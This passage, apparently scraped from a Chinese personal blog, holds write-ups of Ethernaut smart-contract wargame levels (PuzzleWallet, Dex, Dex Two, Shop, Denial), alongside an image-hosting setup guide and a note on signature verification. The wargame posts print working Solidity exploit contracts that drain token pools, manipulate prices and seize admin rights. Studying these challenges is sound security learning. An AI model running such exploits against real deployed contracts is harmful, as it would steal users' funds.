ether在我们的余额中计入。有关更多详细信息，请参阅上面的解释 执行 multicall，现在PuzzleWallet里面没有以太币了 呼吁setMaxBalance(uint256(player));成为admin的PuzzleProxy 这是用于解决挑战的测试代码 123456789101112131415161718192021222324252627282930function exploitLevel() internal override &#123; vm.startPrank(player, player); // Exploit the contract to become the owner of `PuzzleWallet` level.proposeNewAdmin(player); // Now that we are the admin, add ourself to the whitelisted user list // to be able to deposit, execute and multicall puzzleWallet.addToWhitelist(player); // Build the payload to drain the wallet and be able to call `setMaxBalance` bytes[] memory callsDeep = new bytes[](1); callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); bytes[] memory calls = new bytes[](2); calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep); puzzleWallet.multicall&#123;value: 0.001 ether&#125;(calls); // Execute the batched calls payload puzzleWallet.execute(player, 0.002 ether, &quot;&quot;); // Become the admin of the `PuzzleProxy` puzzleWallet.setMaxBalance(uint256(player)); // Assert that we have completed the challenge assertEq(level.admin(), player); vm.stopPrank();&#125; 您可以阅读挑战的完整解决方案打开PuzzleWallet.t.sol 3. 解析","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Dex Two","slug":"Smart contracts/ethernaut/Dex Two","date":"2023-03-11T04:15:10.000Z","updated":"2023-03-11T04:15:10.000Z","comments":true,"path":"2023/03/11/Smart contracts/ethernaut/Dex Two/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/11/Smart%20contracts/ethernaut/Dex%20Two/","excerpt":"","text":"Dex Two1. 题目要求 1.1 This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way. You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level. You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token. Things that might help: 题目代码 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;; contract DexTwo is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function add_liquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableTokenTwo(token1).approve(msg.sender, spender, amount); SwappableTokenTwo(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125; &#125; contract SwappableTokenTwo is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125; &#125; 1234567891011121314151617181920212223## 2. 分析### tips：[参考博客](https://stermi.xyz/blog/ethernaut-challenge-22-solution-dex-two)- 2.1 分析合约： - `swap` 函数 ： - ```solidity function swap( address from, address to, uint256 amount ) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; - 当前`swap`函数不检查`from`，实际上是合约处理的`to`白名单`token1`和代币。`token2``DexTwo` 这是该函数先前版本中存在的检查：`require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);` 这是什么意思？这允许攻击者调用该`swap`函数，出售**任意** 令牌以从 Dex`from`获取“真实”令牌。`to`这意味着我们可以创建一个`UselessERC20`完全由我们拥有和管理的全新代币（我们可以铸造、销毁、做任何我们想做的事）并获得一些`token1`或`token2`免费获得。 我们可以耗尽`DexTwo`合同`token1`并`token2`各打一次电话吗？为此，我们需要找到正确的`fakeToken`卖出数量以取回 100 `token1`。 - 做数学计算，看一下getSwapAmount函数 - &gt; ```unknown &gt; 100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken &gt; 100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken &gt; 123456 - 我们有两个可以控制的变量。我们肯定知道它`DexBalanceOfFakeToken`必须**&gt; 1**否则交易将因为被**0 除**而恢复。如果我们发送 1`FakeToken`给`DexTwo`我们 - &gt; ```unknown100 token1 = amountOfFakeTokenToSell * 100 / 11 token1 = amountOfFakeTokenToSell - 因此，通过`1 FakeToken1`向`DexTwo`合约发送给它一些流动性，我们可以交换 100`FakeToken`以取回 100 `token1`。之后，我们只需要对**另一个**实例重复相同的操作，并从 Dex 中`FakeToken2`排出所有的。`token2` 攻击合约 function exploitLevel() internal override &#123; vm.startPrank(player, player); // Deploy a fake token based on the SwappableTokenTwo contract // Mint 10k tokens and send them to the player (msg.sender) SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); // Approve the dex to manage all of our token token1.approve(address(level), 2**256 - 1); token2.approve(address(level), 2**256 - 1); fakeToken1.approve(address(level), 2**256 - 1); fakeToken2.approve(address(level), 2**256 - 1); // send 1 fake token to the DexTwo to have at least 1 of liquidity ERC20(fakeToken1).transfer(address(level), 1); ERC20(fakeToken2).transfer(address(level), 1); // Swap 100 fakeToken1 to get 100 token1 level.swap(address(fakeToken1), address(token1), 1); // Swap 100 fakeToken2 to get 100 token2 level.swap(address(fakeToken2), address(token2), 1); // Assert that we have drained the Dex contract assertEq(token1.balanceOf(address(level)) == 0 &amp;&amp; token2.balanceOf(address(level)) == 0, true); vm.stopPrank(); &#125; 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Dex","slug":"Smart contracts/ethernaut/Dex","date":"2023-03-10T02:17:10.000Z","updated":"2023-03-10T02:17:10.000Z","comments":true,"path":"2023/03/10/Smart contracts/ethernaut/Dex/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/10/Smart%20contracts/ethernaut/Dex/","excerpt":"","text":"Dex1. 题目要求 1.1 此题目的目标是让您破解下面的基本合约并通过价格操纵窃取资金。 一开始您可以得到10个token1和token2。合约以每个代币100个开始。 如果您设法从合约中取出两个代币中的至少一个，并让合约得到一个的“坏”的token价格，您将在此级别上取得成功。 注意： 通常，当您使用ERC20代币进行交换时，您必须approve合约才能为您使用代币。为了与题目的语法保持一致，我们刚刚向合约本身添加了approve方法。因此，请随意使用 contract.approve(contract.address, ) 而不是直接调用代币，它会自动批准将两个代币花费所需的金额。 请忽略SwappableToken合约。 可能有帮助的注意点： 代币的价格是如何计算的？ approve方法如何工作？ 您如何批准ERC20 的交易？ 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;; contract Dex is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function addLiquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125; &#125; contract SwappableToken is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125; &#125; 123456789101112131415161718- ## 2. 分析#### tips： [参考博客](https://stermi.xyz/blog/ethernaut-challenge-21-solution-dex)- 2.1 分析代码可知：这是一个简单的`ERC20`令牌，它向铸造一个`initialSupply`（指定为 的输入）并覆盖了函数以防止地址能够批准任何令牌。- 2.2 分析 Dex.sol 合约可知，它允许`owner`Dex 提供一对代币的流动性`token1`，并且`token2`在最终用户交换这些代币时不收取任何费用。最终用户将使用 Dex 来`swap`（出售）特定数量的一种代币，以取回`swapAmount`（取决于 Dex 的代币价格）另一种代币。- #### `function setTokens(address _token1, address _token2) public onlyOwner` ```solidity function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; 该功能允许Dex平台的所有者设置`token1`和的地址`token2`。该函数正确检查只有`owner`Dex 的 才能调用此函数。`owner`当已经提供这些代币的供应时，防止更改这些地址也是有意义的（否则旧代币将永远卡在合约中）。 #### `function approve(address spender, uint256 amount) public` 1234function approve(address spender, uint256 amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount);&#125; 这是一个更实用的功能，允许最终用户批准`spender`管理`amount`两个令牌中的一个。这里没有什么奇怪的。您可以通过直接调用传递相同参数的`token1`和函数来实现相同的结果，正如我所说的，它只是一个实用函数，可以让最终用户的生活更轻松。`token2` `approve` ### `function balanceOf(address token, address account) public view returns (uint256)` 123function balanceOf(address token, address account) public view returns (uint256) &#123; return IERC20(token).balanceOf(account);&#125; 获取特定代币地址的用户余额的简单实用函数。 ### `function swap(address from, address to, uint256 amount) public` 123456789101112function swap( address from, address to, uint256 amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount);&#125; 这是负责将一个代币与另一个代币交换（出售/购买）的功能。您看到的第一个`require`，检查您是否只能交换`token1`，`token2`反之亦然。 之后，Dex 计算掉期价格。对于给定amount的一个令牌，用户取回了多少其他令牌？ 然后它执行所有需要的传输 amount将出售的代币从用户转移到 Dex 合约 批准Dex管理swapAmount用户购买的代币 swapAmount从 Dex 向用户转移金额 当且仅当两者token1都是代币标准token2的良好实施时，才不需要对这些金额进行检查ERC20。当前的 Dex 正在使用 OpenZeppelin ERC20 实现的两种代币，因此如果 Dex 或用户的余额中没有足够数量的代币来执行转账，交易将自动恢复 function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256)这是整个合约中最核心也是最重要的功能。此功能负责计算掉期价格。执行 的tokenX交换操作时，用户获得多少令牌？tokenY Dex 内部的当前实现是使用代币余额来计算价格，并因此计算用户将收到的代币数量。 为什么这是个问题？使用余额作为计算价格的一个因素将使您的合约热衷于称为“价格操纵”的攻击，不幸的是（但不仅与这个简单的余额案例有关）它并不少见。 用于计算用户因交换操作而收到的代币数量的公式如下((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))) 这个公式告诉你当你发送代币to时你会得到多少代币。较低的是（与 的余额相比）的余额，较高的是 的金额。amount``from``from``to``to 该 Dex 不使用外部Oracle（如Chainlink）或Uniswap TWAP（时间加权平均价格）来计算掉期价格。相反，它使用令牌的余额来计算它，我们可以利用它。 在 Solidity 中，有一个称为“舍入误差”的已知问题。这个问题是由所有整数除法向下舍入到最接近的整数这一事实引起的。这意味着如果你执行5/2结果将不是2.5but 2。 举个例子，如果我们卖掉 1，token1但token2*amount &lt; token1我们会拿回0 token2！基本上我们会出售代币以获得零回报！ 2.3 参考视频 编写攻击合约 contract Hack &#123; IDex private immutable dex; IERC20 private immutable token1; IERC20 private immutable token2; constructor (IDex _dex) &#123; dex = _dex; token1 = IERC20(dex.token1); token2 = IERC20(dex.token2); &#125; function pwn() external &#123; token1.transferFrom(msg.sender, address(this), 10); token2.transferFrom(msg.sender, address(this), 10); token1.approve(address(dex), type(uint).max); token2.approve(address(dex), type(uint).max); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); dex.swap(address(token2), address(token1), 45); require(token1.balanceOf(address(dex)) == 0, &quot;dex.balance != 0&quot;); &#125; function _swap(IERC20 tokenIn, IERC20 tokenOut) private &#123; dex.swap( address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this))) &#125; &#125; 3. 解题（资金不足）","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Shop","slug":"Smart contracts/ethernaut/Shop","date":"2023-03-08T04:47:10.000Z","updated":"2023-03-08T04:47:10.000Z","comments":true,"path":"2023/03/08/Smart contracts/ethernaut/Shop/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/08/Smart%20contracts/ethernaut/Shop/","excerpt":"","text":"Shop1. 题目要求 1.1 您能在商店以低于要求的价格购买到商品吗？ 可能有帮助的注意点： shop合约预计由买家使用 了解view函数的限制 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Buyer &#123; function price() external view returns (uint); &#125; contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price(); &#125; &#125; &#125; 1234567891011121314151617181920212223242526272829## 2. 分析#### tips：[参考博客](https://stermi.xyz/blog/ethernaut-challenge-20-solution-shop)- 2.1 观察代码可知 ，我们有一个`price`内部合同，代表购买该物品必须支付`wei`的金额。`Buyer` **也可以仅在尚未售出的**情况下购买该商品。该属性由函数中`isSold`初始化为`false`然后更改为的状态变量处理。- 2.2 详细查看 buy() 函数，- 这是合约的主要功能。它投射到`msg.sender`并`Buyer`通过这样做它期望交易的发送者是一个实现接口中定义的功能的**合约**。`` 即使在挑战描述中没有明确说明，也应该返回**买家**愿意为购买商店商品支付的`function price() external view returns (uint256);`价格。 合同检查买方的价格（买方愿意支付的价格）是否大于商店的价格，并检查该商品是否尚未售出。如果这个要求通过，它会更新`isSold`到`true`并将`price`的值更新为`_buyer.price();`理论上**应该**与之前一条指令返回的值相同。- 2.3 这里的关键概念是：你**永远不应该** **盲目地相信**你期望**外部参与者**会做什么，即使你定义了一个具有外部参与者应该信任的逻辑的特定接口。 **永远不要盲目相信不在你控制之下的事情。** 因为**我们**是买家，所以我们可以简单的实现`price`这样的功能 ```solidity function price() external view returns (uint256) &#123; return victim.isSold() ? 1 : 1000; &#125; 因为`price`是一个`view`函数，我们不能有一个内部状态变量来改变`uint256`函数返回的值，但我们可以进行标记为`view`或 的外部调用函数`pure`。 2.4 参考视频 写的攻击合约 1234567891011121314151617181920contract Hack &#123; Shop private immutable target; constructor (address _target) &#123; target = Shop(_target); &#125; function pwn() external &#123; target.buy(); require(target.price() == 99, &quot;price != 99&quot;); &#125; function price() external view returns (uint) &#123; if (target.isSold()) &#123; return 99; &#125; return 100; &#125;&#125; 3. 解题（暂时没有以太了，到时候有钱了再来做，生成实例就需要 0.3ether）","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"靶场总结","slug":"Smart contracts/ethernaut/总结","date":"2023-02-23T04:10:10.000Z","updated":"2023-02-23T04:10:10.000Z","comments":true,"path":"2023/02/23/Smart contracts/ethernaut/总结/","link":"","permalink":"https://biyouqiuqiu.com/2023/02/23/Smart%20contracts/ethernaut/%E6%80%BB%E7%BB%93/","excerpt":"","text":"总结题目对我来说还是挺难的，很多题都是做出来但是还没有彻底理解和熟练运用，以后还得多花点时间来消化和吸收 做题的参考有如下： 博客1 博客2 博客3 做题视频 目前进度 20 ，花费ether 大约 2以太","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"总结","slug":"总结","permalink":"https://biyouqiuqiu.com/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"hexo 图床搭建的痛苦历程","slug":"Hexo/hexo 图床搭建的痛苦历程","date":"2023-02-02T16:00:00.000Z","updated":"2023-02-02T16:00:00.000Z","comments":true,"path":"2023/02/03/Hexo/hexo 图床搭建的痛苦历程/","link":"","permalink":"https://biyouqiuqiu.com/2023/02/03/Hexo/hexo%20%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA%E7%9A%84%E7%97%9B%E8%8B%A6%E5%8E%86%E7%A8%8B/","excerpt":"","text":"完善博客图床上传的问题痛苦：本地图片写入博客文档中，在本地可以看见，但是一旦上传到hexo博客上，图片都是无法显示的，都只能通过在线网站，将图片转换成链接的形式，这样真的很麻烦。所以就决定使用图床的方法来进行自动转换。一、使用GitHub作为存储位置tips: 我发现，用GitHub插入图片写博客的话，需要科学上网才行，我不知道为什么，不过问题不大，不能科学上网就使用其他图床就🆗啦1.1 首先得有GitHub的账号，在GitHub上面新建一个专门存储图片的仓储，并获取它的令牌，进去的方式：点击 头像 &#x3D;&#x3D;&gt; setting &#x3D;&#x3D;&gt; Develper settings 1.2 new一个token 1.3 回到 PicGo 上， 分支部分现在都是main 分支，红色部分都为[用户名]&#x2F;[仓库名]，自定义域名哪里的末尾加上@main ，为了方便复制，https://cdn.jsdelivr.net/gh/[用户名]/[仓库名]@main 将上面生成的token粘贴到指定位置就ok了，最后要点击 “设为默认图床”，否则他不会和执行这个图床的，（踩坑亿个小时）1https://cdn.jsdelivr.net/gh/[用户名]/[仓库名]@main 二、使用SM.MS作为存储位置2.1 SM.MS传送门 ，在网站上注册一个账号 2.2 创建令牌 2.3 在PicGo上配置SM.MS图床，在备用上传域名填 smms.app（我的PicGo的版本为2.3.1），将上面生成的token粘贴到指定位置就ok了，最后要点击 “设为默认图床”，否则他不会和执行这个图床的，（踩坑亿个小时） 三、使用vika维格表存储3.1 在vika官网 上注册一个账号 3.2 新建自己的多维空白表格，并获取其id 3.3 获取令牌：点击左下角的头像 &#x3D;&#x3D;&gt;个人设置 3.4 在PicGo上填入相关的 ID 和 token tips: 令牌token只需要一个就行了，vika中可以建多张表，如果需要更换储存位置只需要在PicGo中更换维格表ID就行了最不济的方法就是，使用网站上传，转换网站1https://moe.photo/","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/tags/Hexo/"},{"name":"图床","slug":"图床","permalink":"https://biyouqiuqiu.com/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"sm.ms","slug":"sm-ms","permalink":"https://biyouqiuqiu.com/tags/sm-ms/"},{"name":"vika","slug":"vika","permalink":"https://biyouqiuqiu.com/tags/vika/"}]},{"title":"了解签名认证","slug":"Solidity/Basic_Knowledge/了解签名认证","date":"2023-01-22T08:47:10.000Z","updated":"2023-01-22T08:47:10.000Z","comments":true,"path":"2023/01/22/Solidity/Basic_Knowledge/了解签名认证/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/22/Solidity/Basic_Knowledge/%E4%BA%86%E8%A7%A3%E7%AD%BE%E5%90%8D%E8%AE%A4%E8%AF%81/","excerpt":"","text":"验证签名1. 签名代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// SPDX-License-Identifier: MITpragma solidity ^0.8.4; /* 1. message to sign 2. hash(message) 3. sign(hash(message), private key) | offchain 4. ecrecover(hash(message), signature) == signer */contract VerifySig &#123; // verify 验证签名函数 function verify(address _signer, string memory _message, bytes memory _sig) external pure returns(bool) &#123; bytes32 messageHash = getMessageHash(_message); // 对输入的消息进行 hash运算 bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash); // 对输入消息进行二次hash return recover(ethSignedMessageHash, _sig) == _signer; // 判断公钥的地址是否与_signer 相等? &#125; function getMessageHash(string memory _message) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked(_message)); // 对消息进行hash运算 &#125; function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; //在消息中加入 &quot;\\x19Ethereum Signed Message:\\n32&quot; 字符串,将该字符串和 _messageHash 打包并进行hash运算 return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); &#125; function recover(bytes32 _ethSignedMessageHash, bytes memory _sig) public pure returns(address) &#123; (bytes32 r, bytes32 s, uint8 v) = _split(_sig); // 将_sig 分割为 r, s, v三个部分 return ecrecover(_ethSignedMessageHash, v, r, s); &#125; function _split(bytes memory _sig) internal pure returns(bytes32 r, bytes32 s, uint8 v) &#123; require(_sig.length == 65, &quot;invalud signature length&quot;); assembly &#123; // add(_sig, 32) 指跳过32位长度, 去获取_sig 中的一个32位数据 r := mload(add(_sig, 32)) // add(_sig, 64) 指跳过64位长度, 去获取_sig 中的一个32位数据 s := mload(add(_sig, 64)) // add(_sig, 96) 指跳过96位长度, 去获取_sig 中的一个32位数据 // byte(0, mload(add(_sig, 96))) 返回32位中的第一个值 v := byte(0, mload(add(_sig, 96))) &#125; &#125;&#125; 2. 心得参悟：2.1 ecrecover()函数，作用：在solidity中是，将签名的公钥返回。即，假如我使用我的🦊账户给消息进行签名，得到一个签名；在ecrecover() 函数中传入 以太坊签名消息（对消息进行二次 hash运算的结果） ，和签名的组成部分 r , s, v，最终返回的结果为 我🦊钱包的账户地址（公钥） 概括：ecrecover()函数通过传入的”以太坊签名消息” 和 “签名的（r s v）组成部分” 返回公钥（🦊钱包账户地址的前身）2.2 计算以太坊签名消息： 消息可以是能被执行的交易，也可以是其他任何形式。为了避免用户误签了恶意交易，EIP191提倡在消息前加上&quot;\\x19Ethereum Signed Message:\\n32&quot;字符，并再做一次keccak256哈希，作为以太坊签名消息。经过toEthSignedMessageHash()函数处理后的消息，不能被用于执行交易:12345function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); //在消息中加入 &quot;\\x19Ethereum Signed Message:\\n32&quot; 字符串,将该字符串和_messageHash 打包并进行hash运算 &#125; 3. 数字签名的相关知识链接","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"}]},{"title":"Denial","slug":"Smart contracts/ethernaut/Denial","date":"2023-01-19T07:10:10.000Z","updated":"2023-01-19T07:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/Denial/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Denial/","excerpt":"","text":"Denial1. 题目要求 1.1 这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。 通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M） 1.2 题目要求 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Denial &#123; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance / 100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call&#123;value:amountToSend&#125;(&quot;&quot;); payable(owner).transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = block.timestamp; withdrawPartnerBalances[partner] += amountToSend; &#125; // allow deposit of funds receive() external payable &#123;&#125; // convenience function function contractBalance() public view returns (uint) &#123; return address(this).balance; &#125; &#125; 12345678910111213141516171819## 2. 分析#### tips： [参考博客](https://stermi.medium.com/the-ethernaut-challenge-19-solution-denial-e498e19e9b4d)- 2.1这个函数做了什么： - 设置合约的余额`amountToSend` - `partner`通过低级别将余额的 1% 转移到`call` - 将余额的 1% 转入合约的`owner`via`transfer` - `withdraw`更新函数最后一次执行的时间 - 更新合作伙伴提取的金额 正如我们所说，这个挑战完全是关于拒绝服务 (DOS) 的概念，这是一个通用术语，用于描述外部参与者拒绝服务的某个方面的情况。在这种特定情况下，我们要否认`withdraw`合约的过程。 我们该怎么做？`call`我们唯一的选择是在外部对地址做一些坏事`partner`。让我们看看底层`call`在 Solidity 中是如何工作的。 (bool success, bytes memory data) = targetAddress.call&#123;value: &lt;weiSent&gt;, gas: &lt;gasForwarded&gt;&#125;(&lt;calldata&gt;); 1234567891011121314151617181920212223242526272829303132333435363738394041 正如我提到的，这是一个允许您做很多事情的低级函数。通常，它用于： - `value`通过在选项中指定 wei 的数量将 Ether 发送到 EAO - 通过在选项中指定 wei 的数量，将 Ether 发送到已实现`receive`or函数的合约`fallback``value` - 通过将哪个函数和哪些参数传递给目标函数来调用合约函数`&lt;calldata&gt;`。例如，`abi.encodeWithSignature(&quot;callMePlease()&quot;)` 虽然这两个`transfer`高级`send`函数（用于将 ETH 发送到目标地址）都使用**2300 gas**的硬编码量来执行操作，但该`call`函数有两个选项： - 默认情况下，如果您不指定任何内容，它将转发**所有剩余的交易气体** - `gas`否则，您可以指定外部合约可以使用参数的气体量 该`call`函数将返回两个参数： - `bool success`如果调用成功 - `bytes memory data`返回值 每次你执行一个`call`你应该**总是**检查它是否已经成功并恢复（或处理它但是你的场景需要）如果`success`值为假。有关此方面的更多信息，请参阅[SWC-104：未经检查的调用返回值。](https://swcregistry.io/docs/SWC-104) 无论如何，回到我们的场景。我们需要找到一种方法来在`Denial` `withdraw`函数向我们发送`partner`资金时对其进行 DoS。 因为函数没有检查返回值（一般来说，这是一个巨大的错误，请参阅 SWC-104 问题）**即使我们**在调用执行中恢复`withdraw`，函数的流程也会继续。我们如何强制停止执行？ 我们唯一的选择是**排出所有转发的气体**，并由于“气体不足”异常而使智能合约恢复。 一种简单的方法是使用无限循环对状态变量执行计数器增加- 